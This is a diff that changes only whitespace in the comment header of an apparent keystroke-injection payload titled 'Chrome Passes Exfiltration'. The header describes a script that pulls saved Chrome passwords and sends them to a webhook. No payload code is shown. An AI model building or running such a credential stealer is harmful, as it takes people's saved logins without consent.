@@ -1,7 +1,7 @@
 REM ################################################################################################################
-REM # Title: Chrome Passes Exfiltration based on UNC0V3R3D's wbpv method (UNC0V3R3D#8662 on Discord)                #
+REM # Title: Chrome Passes Exfiltration based on UNC0V3R3D's wbpv method (UNC0V3R3D#8662 on Discord)                 #
 REM # Description: This script appears to be attempting to retrieve saved login data from Google Chrome and        #
-REM send it to a specified webhook URL.                                                                             #                                                   
+REM send it to a specified webhook URL.                                                                              #                                                 
 REM # Author: B4ph0m3th                                                                                            #
 REM Version:	1.0                                                                                                  #
 REM Description: Shows all saved Chrome passwords                                                                  #
